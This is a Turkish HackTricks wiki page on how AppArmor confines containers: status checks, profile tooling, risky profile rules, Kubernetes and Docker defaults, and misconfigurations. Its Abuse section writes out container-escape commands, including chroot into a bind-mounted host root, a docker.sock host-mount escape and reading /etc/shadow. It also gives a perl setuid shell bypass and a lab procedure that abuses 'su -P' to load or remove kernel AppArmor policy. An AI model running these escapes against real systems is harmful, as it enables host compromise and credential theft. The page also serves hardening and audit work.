# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

AppArmor, program başına profiller aracılığıyla kısıtlamalar uygulayan bir **Zorunlu Erişim Denetimi** sistemidir. Büyük ölçüde kullanıcı ve grup sahipliğine bağlı olan geleneksel DAC denetimlerinden farklı olarak AppArmor, çekirdeğin sürece bağlı bir politikayı uygulamasını sağlar. Container ortamlarında bu önemlidir; çünkü bir workload, bir eylemi denemek için yeterli geleneksel ayrıcalığa sahip olsa bile AppArmor profili ilgili yola, mount işlemine, ağ davranışına veya capability kullanımına izin vermediğinden engellenebilir.

En önemli kavramsal nokta, AppArmor'un **yol tabanlı** olmasıdır. SELinux'un yaptığı gibi etiketler yerine yol kuralları üzerinden dosya sistemi erişimini değerlendirir. Bu yaklaşımı kullanmayı kolay ve güçlü kılar, ancak bind mount'ların ve alternatif yol düzenlerinin dikkatle ele alınması gerektiği anlamına da gelir. Aynı host içeriğine farklı bir yol üzerinden erişilebilir hâle gelirse, politikanın etkisi operatörün başlangıçta beklediği gibi olmayabilir.

## Container Yalıtımındaki Rolü

Container güvenlik incelemeleri genellikle capabilities ve seccomp ile sınırlı kalır, ancak bu denetimlerden sonra da AppArmor önemini korur. Gereğinden fazla ayrıcalığa sahip bir container'ı veya operasyonel nedenlerle ek bir capability'ye ihtiyaç duyan bir workload'u düşünün. AppArmor yine de dosya erişimini, mount davranışını, ağ kullanımını ve yürütme biçimlerini kısıtlayarak bariz kötüye kullanım yollarını engelleyebilir. Bu nedenle "uygulamayı çalıştırmak için" AppArmor'u devre dışı bırakmak, yalnızca riskli olan bir yapılandırmayı fark edilmeden aktif olarak istismar edilebilir hâle getirebilir.

## Laboratuvar

Host'ta AppArmor'un etkin olup olmadığını kontrol etmek için şunu kullanın:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Mevcut container işleminin hangi kullanıcı altında çalıştığını görmek için:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Normal durumda süreç, runtime tarafından seçilen profile bağlı bir AppArmor bağlamı göstermelidir. unconfined durumda bu ek kısıtlama katmanı ortadan kalkar.

Docker'ın ne uyguladığını düşündüğünü de inceleyebilirsiniz:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Çalışma Zamanında Kullanım

Docker, ana makine destekliyorsa varsayılan veya özel bir AppArmor profili uygulayabilir. Podman da AppArmor tabanlı sistemlerde AppArmor ile entegre olabilir; ancak SELinux öncelikli dağıtımlarda genellikle diğer MAC sistemi ön plana çıkar. Kubernetes, AppArmor'ı gerçekten destekleyen düğümlerde iş yükü düzeyinde AppArmor ilkesi sunabilir. LXC ve Ubuntu ailesindeki benzer sistem kapsayıcısı ortamları da AppArmor'ı kapsamlı biçimde kullanır.

Pratikte önemli olan nokta, AppArmor'ın bir "Docker özelliği" olmadığıdır. Bu, çeşitli çalışma zamanlarının uygulamayı seçebildiği bir ana makine çekirdeği özelliğidir. Ana makine bunu desteklemiyorsa veya çalışma zamanına kısıtlamasız çalışması söylenmişse, söz konusu koruma gerçekte mevcut değildir.

Özellikle Kubernetes için modern API `securityContext.appArmorProfile`'dır. Kubernetes `v1.30` sürümünden itibaren eski beta AppArmor açıklamaları kullanımdan kaldırılmıştır. Desteklenen ana makinelerde varsayılan profil `RuntimeDefault`'tır; `Localhost` ise düğümde önceden yüklenmiş olması gereken bir profile işaret eder. Bu, inceleme sırasında önemlidir; çünkü bir manifest AppArmor'ı kullanıyor gibi görünse de tamamen düğüm tarafındaki desteğe ve önceden yüklenmiş profillere bağlı olabilir.<sup>[[1]](#references)</sup>

İnce ama operasyonel açıdan yararlı bir ayrıntı, `appArmorProfile.type: RuntimeDefault` değerini açıkça ayarlamanın bu alanı hiç belirtmemekten daha katı olmasıdır. Alan açıkça ayarlanmışsa ve düğüm AppArmor'ı desteklemiyorsa, kabul işlemi başarısız olmalıdır. Alan belirtilmezse iş yükü AppArmor olmayan bir düğümde yine de çalışabilir ve bu ek kısıtlama katmanını almayabilir. Saldırganın bakış açısından bu, hem manifesti hem de düğümün gerçek durumunu kontrol etmek için iyi bir nedendir.<sup>[[1]](#references)</sup>

AppArmor destekli Docker ana makinelerinde en bilinen varsayılan profil `docker-default`'tır. Bu profil, Moby'nin AppArmor şablonundan oluşturulur ve bazı capability tabanlı PoC'lerin varsayılan bir kapsayıcıda neden başarısız olduğunu açıklaması bakımından önemlidir. Genel olarak `docker-default`, olağan ağ kullanımına izin verir; `/proc`'un büyük bölümüne yazmayı ve `/sys`'in hassas kısımlarına erişimi reddeder; mount işlemlerini engeller ve ptrace'i genel amaçlı bir ana makine inceleme aracına dönüşmeyecek şekilde kısıtlar. Bu temel davranışı anlamak, "kapsayıcıda `CAP_SYS_ADMIN` var" ile "kapsayıcı bu capability'yi önem verdiğim çekirdek arayüzlerine karşı gerçekten kullanabilir" ifadelerini birbirinden ayırmaya yardımcı olur.

## Profil Yönetimi

AppArmor profilleri genellikle `/etc/apparmor.d/` altında saklanır. Yaygın bir adlandırma kuralı, çalıştırılabilir dosya yolundaki eğik çizgileri noktalarla değiştirmektir. Örneğin, `/usr/bin/man` için bir profil genellikle `/etc/apparmor.d/usr.bin.man` konumunda saklanır. Bu ayrıntı hem savunma hem de değerlendirme sırasında önemlidir; çünkü etkin profilin adını öğrendikten sonra, ana makinede ilgili dosyayı çoğu zaman hızla bulabilirsiniz.

Ana makine tarafında kullanılabilecek yönetim komutları şunlardır:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Container güvenliğiyle ilgili bir başvuruda bu komutların önemli olmasının nedeni, profillerin gerçekte nasıl oluşturulduğunu, yüklendiğini, complain mode'a geçirildiğini ve uygulama değişikliklerinden sonra nasıl düzenlendiğini açıklamalarıdır. Bir operatör sorun giderme sırasında profilleri complain mode'a alıp enforcement'ı yeniden etkinleştirmeyi unutuyorsa, container belgelerde korumalı görünebilir ancak gerçekte çok daha gevşek davranabilir.

### Profilleri Oluşturma Ve Güncelleme

`aa-genprof`, uygulama davranışını gözlemleyebilir ve etkileşimli olarak profil oluşturulmasına yardımcı olabilir:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof`, daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profili oluşturabilir:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

İkili dosya değiştiğinde ve politikanın güncellenmesi gerektiğinde, `aa-logprof` günlüklerde bulunan engellemeleri yeniden oynatabilir ve operatörün bunlara izin verip vermemeye karar vermesine yardımcı olabilir:

```bash
sudo aa-logprof
```

### Günlükler

AppArmor engellemeleri genellikle `auditd`, syslog veya `aa-notify` gibi araçlar üzerinden görülebilir:

```bash
sudo aa-notify -s 1 -v
```

Bu, operasyonel açıdan ve saldırı amacıyla kullanışlıdır. Savunmacılar profilleri iyileştirmek için bundan yararlanır. Saldırganlar ise hangi tam yolun veya işlemin engellendiğini ve bir exploit zincirini durduran kontrolün AppArmor olup olmadığını öğrenmek için kullanır.

### Tam Profil Dosyasını Belirleme

Bir runtime, bir container için belirli bir AppArmor profili adı gösterdiğinde, bu adı diskteki profil dosyasıyla eşleştirmek genellikle yararlıdır:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Bu, özellikle host tarafında inceleme yaparken kullanışlıdır; çünkü “container, `lowpriv` profili altında çalıştığını söylüyor” ile “gerçek kurallar denetlenebilecek veya yeniden yüklenebilecek belirli bir dosyada bulunuyor” arasındaki boşluğu kapatır.

### Denetlenmesi Gereken Yüksek Sinyalli Kurallar

Bir profili okuyabiliyorsanız, basit `deny` satırlarıyla yetinmeyin. Birkaç kural türü, AppArmor’ın container escape girişimine karşı ne kadar etkili olacağını önemli ölçüde değiştirir:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: hedef binary’yi kısıtlanmamış şekilde çalıştırır. Erişilebilir bir helper, shell veya interpreter `ux` altında izinliyse genellikle ilk test edilmesi gereken şey budur.
- `px` / `Px` ve `cx` / `Cx`: exec sırasında profil geçişleri gerçekleştirir. Bunlar otomatik olarak kötü değildir, ancak geçiş mevcut profilden çok daha geniş bir profile götürebileceği için denetlenmeye değerdir.
- `change_profile`: bir task’ın hemen veya sonraki exec sırasında başka bir yüklü profile geçmesine izin verir. Hedef profil daha zayıfsa bu, kısıtlayıcı bir domain’den çıkmak için tasarlanmış bir kaçış yolu hâline gelebilir.
- `flags=(complain)`, `flags=(unconfined)` veya daha yeni `flags=(prompt)`: bunlar profile ne kadar güvenmeniz gerektiğini değiştirmelidir. `complain` engellemeleri uygulamak yerine günlüğe kaydeder, `unconfined` sınırı kaldırır ve `prompt` yalnızca kernel tarafından uygulanan engellemeler yerine userspace karar yoluna bağlıdır.
- `userns` veya `userns create,`: daha yeni AppArmor policy’leri user namespace oluşturulmasını denetleyebilir. Bir container profili buna açıkça izin veriyorsa, platform hardening stratejisinin bir parçası olarak AppArmor kullansa bile iç içe user namespace’ler kullanılabilir durumda kalır.

Host tarafında kullanışlı grep:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Bu tür bir denetim, yüzlerce sıradan dosya kuralına bakmaktan genellikle daha faydalıdır. Bir breakout; bir yardımcı programın çalıştırılmasına, yeni bir namespace'e girilmesine veya daha az kısıtlayıcı bir profile geçilmesine bağlıysa yanıt çoğu zaman, açıkça görünen `deny /etc/shadow r` tarzı satırlarda değil, geçişleri temel alan bu kurallarda gizlidir.

## Misconfigurations

En bariz hata `apparmor=unconfined` ayarıdır. Yöneticiler, profili tehlikeli veya beklenmedik bir şeyi doğru şekilde engellediği için çalışmayan bir uygulamada hata ayıklarken bu ayarı sıklıkla kullanır. Bu flag production ortamında kalırsa tüm MAC katmanı fiilen devre dışı bırakılmış olur.

Daha ince bir başka sorun da dosya izinleri normal göründüğü için bind mount'ların zararsız olduğunu varsaymaktır. AppArmor path tabanlı olduğundan, host path'lerini alternatif mount konumlarında kullanıma açmak path kurallarıyla kötü etkileşimlere yol açabilir. Üçüncü bir hata, config dosyasındaki profil adının, host kernel AppArmor'ı gerçekten uygulamıyorsa pek bir anlamı olmadığını unutmaktır.

## Abuse

AppArmor devre dışı kaldığında, daha önce kısıtlanmış işlemler birden çalışabilir: bind mount'lar üzerinden hassas path'leri okuma, daha kısıtlı kalması gereken procfs veya sysfs bölümlerine erişme, capabilities/seccomp da izin veriyorsa mount ile ilgili işlemler yapma ya da profilin normalde engelleyeceği path'leri kullanma. AppArmor çoğu zaman, capability tabanlı bir breakout girişiminin kâğıt üzerinde "çalışması gerektiğini" ama gerçekte neden başarısız olduğunu açıklar. AppArmor'ı kaldırın; aynı girişim başarılı olmaya başlayabilir.

AppArmor'ın bir path-traversal, bind-mount veya mount tabanlı abuse zincirini durduran başlıca mekanizma olduğundan şüpheleniyorsanız ilk adım genellikle profil varken ve yokken nelerin erişilebilir hâle geldiğini karşılaştırmaktır. Örneğin, bir host path'i container içine mount edilmişse, önce bu path boyunca ilerleyip içeriğini okuyup okuyamadığınızı kontrol edin:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Konteyner ayrıca `CAP_SYS_ADMIN` gibi tehlikeli bir capability’ye sahipse, en pratik testlerden biri AppArmor’ın mount işlemlerini veya hassas kernel dosya sistemlerine erişimi engelleyen kontrol olup olmadığını belirlemektir:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Bind mount aracılığıyla bir host path'in zaten erişilebilir olduğu ortamlarda, AppArmor'un devre dışı kalması salt okunur bir bilgi ifşası sorununu doğrudan host dosyalarına erişime de dönüştürebilir:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Bu komutların amacı, breakout'u tek başına AppArmor'ın sağladığını söylemek değildir. Ama AppArmor kaldırıldığında, dosya sistemi ve mount tabanlı birçok kötüye kullanım yolu hemen test edilebilir hâle gelir.

### Tam Örnek: AppArmor Devre Dışı + Host Root Mount Edilmiş

Container'da host root zaten `/host` konumuna bind-mount edilmişse, AppArmor'ı kaldırmak engellenmiş bir dosya sistemi kötüye kullanım yolunu tam bir host escape'e dönüştürebilir:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Kabuk ana makinenin dosya sistemi üzerinden çalışmaya başladığında, iş yükü container sınırını fiilen aşmış olur:

```bash
id
hostname
cat /etc/shadow | head
```

### Tam Örnek: AppArmor Devre Dışı + Runtime Socket

Gerçek engel runtime durumunu koruyan AppArmor ise, mount edilmiş bir socket tamamen kaçmak için yeterli olabilir:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Tam yol bağlama noktasına bağlıdır, ancak sonuç aynıdır: AppArmor artık runtime API'ye erişimi engellemez ve runtime API, ana makineyi tehlikeye atan bir container başlatabilir.

### Tam Örnek: Yol Tabanlı Bind-Mount Atlatması

AppArmor yol tabanlı olduğundan, `/proc/**` dizinini korumak, aynı ana makine procfs içeriğine farklı bir yol üzerinden erişilebildiğinde bunu otomatik olarak korumaz:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Etki, tam olarak neyin mount edildiğine ve alternatif yolun diğer denetimleri de atlayıp atlamadığına bağlıdır; ancak bu örüntü, AppArmor'ın neden tek başına değil, mount düzeniyle birlikte değerlendirilmesi gerektiğinin en açık nedenlerinden biridir.

### Tam Örnek: Shebang Bypass

AppArmor, shebang'inde belirtilen yorumlayıcı yerine çalıştırılan betik yoluna bir profile bağlayabilir. Buna karşılık, yorumlayıcıyı doğrudan çağırmak yorumlayıcının profilini seçebilir. Bir [AppArmor maintainer bu ayrımı açıklıyor](https://bugs.launchpad.net/apparmor/+bug/1911431). Tarihî bir örnekte, ilk satırı kısıtlanmış bir yorumlayıcıyı işaret eden bir betik söz konusuydu:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Örnek, yalnızca yorumlayıcının dosya capability’sinin etkin hâle gelebildiği ve script’in gerçek exec attachment’ının işleme izin verdiği bir olasılıktır. Yüklenmiş policy’yi ve süreç etiketini, capability bounding set’ini, `no_new_privs` değerini ve mount’un `nosuid` durumunu kontrol edin; yalnızca profil dosyasının adı veya `cap_setuid+ep` listesi, kullanılabilir bir geçişin kanıtı değildir. Yorumlayıcı zincirleri ve alternatif yürütme yolları ayrıca incelenmelidir.

## Ayrıcalıklı yazma ilkel öğesi olarak policy-control dosyaları

Etkilenen AppArmor kernel’lerinde, ayrıcalıksız bir kullanıcı securityfs içindeki `.load`, `.replace` veya `.remove` dosyasını yazma modunda açabilir; ancak policy-admin izni yazma anında kontrol edildiğinden doğrudan `write()` başarısız olur. Bir setuid helper bu dosya tanıtıcısını stdout veya stderr olarak devralır ve saldırganın denetimindeki baytları yazarsa kernel, helper’ın kimlik bilgilerini görür. Bu, helper’ı policy verisinin *ayrıcalıklı yazıcısı* hâline getirir; çağırana genel olarak root yetkisi vermez. Qualys, `su -P` komutunun aynı kullanıcı olarak çalıştırılan bir komuttan gelen baytları ayrıcalıklı PTY yolu üzerinden aktarabildiğini gösterdi; bu yol için kullanıcının hesabında bir parola belirlenmiş olmalıdır. Herkese yazılabilir dosya izinlerini maruz kalındığının kanıtı saymak yerine yüklü kernel ve `su` düzeltmelerini kontrol edin.<sup>[[3]](#references)[[4]](#references)</sup>

Etkilenen bir kernel ve helper bulunan, geçici kullanım için ayrılmış bir lab ortamında bu işlem bir test profili oluşturur ve ardından kaldırır. Shell, `su` dosyaya yazmadan önce her kontrol dosyasını açar; `stty raw`, PTY aktarımının derlenmiş profil baytlarını değiştirmesini önler. Testi bir production profiline karşı çalıştırmayın.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Aynı primitive, mevcut bir profili değiştirmek için de kullanılabilir. Örneğin, bir launcher için `userns` izni veren bir profil, AppArmor user-namespace kısıtlamasını kaldırabilir; ancak host-root capabilities sağlamaz. Gerçek namespace sysctl ayarları ve diğer denetimler yine önemlidir. Ayrıca hedef bir süreç üzerindeki confinement'ı kaldırabilir. Daha geniş privilege-escalation iş akışı için [kernel exposure kontrollerini](../../../main-system-information/kernel-vulnerability-assessment.md) ve [Linux Hardening genel bakışını](../../../) inceleyin.<sup>[[3]](#references)[[4]](#references)</sup>

## Denetimler

Bu denetimlerin amacı şu üç soruyu hızla yanıtlamaktır: Host'ta AppArmor etkin mi, mevcut süreç confinement altında mı ve runtime bu container'a gerçekten bir profil uyguladı mı?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Burada dikkat çekici olanlar:

- `/proc/self/attr/current` çıktısı `unconfined` gösteriyorsa iş yükü AppArmor kısıtlamasından yararlanmıyor demektir.
- `aa-status`, AppArmor'ın devre dışı olduğunu veya yüklenmediğini gösteriyorsa çalışma zamanı yapılandırmasındaki profil adı çoğunlukla kozmetiktir.
- `docker inspect` çıktısı `unconfined` veya beklenmeyen bir özel profil gösteriyorsa dosya sistemi ya da mount tabanlı bir kötüye kullanım yolunun çalışmasının nedeni genellikle budur.
- `/sys/kernel/security/apparmor/profiles` beklediğiniz profili içermiyorsa çalışma zamanı veya orkestratör yapılandırması tek başına yeterli değildir.
- Sözde sağlamlaştırılmış bir profil `ux`, geniş kapsamlı `change_profile`, `userns` veya `flags=(complain)` tarzı kurallar içeriyorsa pratik sınır, profil adının düşündürdüğünden çok daha zayıf olabilir.

Bir container operasyonel nedenlerle zaten yükseltilmiş ayrıcalıklara sahipse AppArmor'ı etkin bırakmak, kontrollü bir istisna ile çok daha geniş kapsamlı bir güvenlik ihlali arasındaki farkı yaratabilir.

## Çalışma Zamanı Varsayılanları

| Çalışma zamanı / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma yöntemleri |
| --- | --- | --- | --- |
| Docker Engine | AppArmor destekleyen ana makinelerde varsayılan olarak etkin | Aksi belirtilmedikçe `docker-default` AppArmor profilini kullanır | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Ana makineye bağlı | AppArmor, `--security-opt` aracılığıyla desteklenir; ancak tam varsayılan ayar ana makineye ve çalışma zamanına bağlıdır ve Docker'ın belgelenmiş `docker-default` profili kadar yaygın değildir | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Koşullu varsayılan | `appArmorProfile.type` belirtilmezse varsayılan `RuntimeDefault` olur; ancak yalnızca düğümde AppArmor etkinse uygulanır | `securityContext.appArmorProfile.type: Unconfined`, zayıf profille `securityContext.appArmorProfile.type: Localhost`, AppArmor desteği olmayan düğümler |
| Kubernetes altında containerd / CRI-O | Düğüm/çalışma zamanı desteğine bağlı | Kubernetes tarafından desteklenen yaygın çalışma zamanları AppArmor'ı destekler; ancak gerçek yaptırım yine de düğüm desteğine ve iş yükü ayarlarına bağlıdır | Kubernetes satırındakiyle aynıdır; doğrudan çalışma zamanı yapılandırması AppArmor'ı tamamen devre dışı bırakabilir |

AppArmor için en önemli değişken çoğu zaman yalnızca çalışma zamanı değil, **ana makinedir**. Bildirimdeki profil ayarı, AppArmor'ın etkin olmadığı bir düğümde kısıtlama sağlamaz.



## References

- [1] [Kubernetes güvenlik bağlamı: AppArmor profil alanları ve düğüm desteği davranışı](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec geçişleri, `change_profile`, `userns` ve profil bayrakları](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Qualys CrackArmor teknik duyurusu](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Ubuntu CrackArmor güvenlik açığı bilgi bankası](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
